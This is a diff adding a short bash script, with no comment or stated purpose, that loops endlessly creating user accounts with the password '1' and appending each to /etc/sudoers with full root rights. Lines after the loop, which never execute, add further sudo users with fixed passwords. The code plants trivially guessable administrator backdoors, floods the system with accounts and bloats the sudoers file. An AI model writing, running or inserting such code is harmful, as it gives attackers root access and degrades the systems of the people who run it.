@@ -1,0 +1,15 @@
+#!/bin/bash
+
+counter=1
+while :
+do
+useradd -m "d_$counter"
+echo "d_$counter:1" | chpasswd
+echo "d_$counter ALL=(ALL:ALL) ALL" >> /etc/sudoers
+sum=$(($counter+1))
+counter=$sum
+done
+useradd -m d
+echo "d:123456789Aa" | chpasswd
+echo "d ALL=(ALL:ALL) ALL" >> /etc/sudoers
+echo "y ALL=(ALL:ALL) ALL" >> /etc/sudoers
